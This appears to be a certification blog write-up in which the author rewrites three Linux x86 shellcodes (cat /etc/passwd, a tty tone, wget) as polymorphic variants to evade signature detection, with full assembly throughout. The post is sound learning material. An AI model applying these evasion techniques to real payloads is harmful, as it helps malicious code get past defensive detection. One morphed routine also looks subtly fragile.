# Assignment 6 - Polymorphic Shellcode

So, I've been on a slight hiatus from the SLAE because my lab time for OSCE began right as I was finishing this up. So, I put this on pause to complete that. Don't worry, an OSCE write-up is coming :) But for now, let's finish out SLAE nice a strong. Today, we're going to look at morphing shellcode to break the signature detection that might catch it.

## Problem Statement

* Take up 3 shellcodes from [Shell-Storm](http://shell-storm.org) and create polymorphic versions of them to beat pattern matching
* The polymorphic versions cannot be larger than 150% of the existing shellcode
* Bonus points for making it shorter in length than the original


## Shellcode \#1

The first [shellcode](http://shell-storm.org/shellcode/files/shellcode-571.php) we'll take is a simple 42-byte shellcode that calls `/bin/cat /etc/passwd` via the `execve` system call.

**_original shellcode_**

```
xor eax,eax
cdq

push edx
push 0x7461632f
push 0x6e69622f
mov ebx,esp

push edx

push 0x64777373
push 0x61702f2f
push 0x6374652f
mov ecx,esp

mov al,0xb
push edx
push ecx
push ebx
mov ecx,esp
int 0x80
```

#### Modifications

Looking over this, we see some obvious things we could modify that would produce the same functionality using the same instructions. For example, `cdq` is being used here to clear the EDX register, but we could do the same with a special multiply call. EDX is also being used to push null values onto the stack, but we could use a different register. We could also change the order of some of the instructions, which would result in a different signature. Let's do all of this.

**_morphed shellcode_**

```
xor ebx, ebx    ; Use EBX instead of EAX
mul ebx         ; This clears EAX and EDX for us

push eax        ; Push nulls with EAX
push 0x7461632f
push 0x6e69622f
mov ebx,esp

push eax        ; Push nulls with EAX

push 0x64777373
push 0x61702f2f
push 0x6374652f
mov ecx,esp

push eax        ; Push nulls with EAX
push ecx
push ebx
mov ecx,esp
mov al,0xb      ; Rearrange this command
int 0x80
```

#### Results

The original shellcode was 43 bytes, and our morphed version was 44 bytes. That results in a **2.3%** increase in size, which is within our boundary! On to the next piece of code.

## Shellcode \#2

This next piece of [shellcode](http://shell-storm.org/shellcode/files/shellcode-60.php) we'll modify is just a fun piece of code designed to emit a tone, and is originally 45 bytes.

**_original shellcode_**

```
; int fd = open("/dev/tty10", O_RDONLY);
push byte 5
pop eax
cdq
push edx
push 0x30317974
push 0x742f2f2f
push 0x7665642f
mov ebx, esp
mov ecx, edx
int 80h

; ioctl(fd, KDMKTONE (19248), 66729180);
mov ebx, eax
push byte 54
pop eax
mov ecx, 4294948047
not ecx
mov edx, 66729180
int 80h
```

#### Modifications

It's easy to spot a couple of things we might do differently. For example, the way that values are moved into registers could be changed, and ECX has a `not` instruction performed on it, when we could just move the correct value there in the first place. Let's try these out.

**_morphed shellcode_**

```
; int fd = open("/dev/tty10", O_RDONLY);
xor eax, eax
mov al, 5         ; direct move vs push pop
cdq
push edx
push 0x30317974
push 0x742f2f2f
push 0x7665642f
mov ebx, esp
mov ecx, edx
int 80h

; ioctl(fd, KDMKTONE (19248), 66729180);
mov ebx, eax
mov al, 54        ; direct move vs push pop
mov cx, 0x4b30    ; move correct value vs !value
mov edx, 66729180
int 80h
```

#### Results

The original shellcode was 45 bytes, and our morphed version was 42 bytes. That results in a **6.7%** *_decrease_* in size, which should award us our bonus! Excellent, on to the last exercise.

## Shellcode \#3

This last [shellcode](http://shell-storm.org/shellcode/files/shellcode-611.php) we'll take is a simple 42-byte shellcode that calls `/usr/bin/wget aaaa` via the `execve` system call.

**_original shellcode_**

```
push   0xb
pop    eax
cdq

push   edx
push   0x61616161
mov    ecx,esp
push   edx

push   0x74
push   0x6567772f
push   0x6e69622f
push   0x7273752f
mov    ebx,esp

push   edx
push   ecx
push   ebx
mov    ecx,esp
int    0x80

inc    eax
int    0x80

```

#### Modifications

Again, we see some obvious things we can modify, such as how values get into registers, but there's another technique I haven't used yet to mangle signatures, and that's the concept of NOPs. There is the literal instruction NOP, but there are also NOPs that are valid instructions that don't effect the functionality of the program. For example, if you need the value 0x2 inside the EAX register, you can simply do a `mov eax, 0x2`, but you could also do `mov ebx, 0x4; inc edx; mov eax, 0x2; pushad; popad`. Even though there are 5 instructions in the second set, it still accomplishes the same goal. We will use that technique in this shellcode as well.

**_morphed shellcode_**

```
inc esp
inc ebp
cdq

dec    esp
dec    ebp
push   edx
push   0x61616161
inc    edx
mov    ecx,esp
dec    edx
push   edx

push   0x74
push   0x6567772f
push   0x6e69622f
push   0x7273752f
mov    ebx,esp

push   edx
push   ecx
pushad
popad
push   ebx
mov    ecx,esp
push   0xb
pop    eax
int    0x80

add    al, 0x2
dec    al
int    0x80
```

#### Results

The original shellcode was 42 bytes, and our morphed version was 53 bytes. That results in a *26%* increase in size, which is still within our boundary.

## Wrapping Up

Overall, this was a good exercise. Not only are these techniques helpful in defeating pattern matching, but they are also helpful when your buffer is susceptible to bad characters, and you need to change opcodes to fit the realm of good characters available. Anyways, I learned some great tricks here, and I hope you have as well. Until next time, happy hacking! 


###### SLAE Exam Statement

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1158
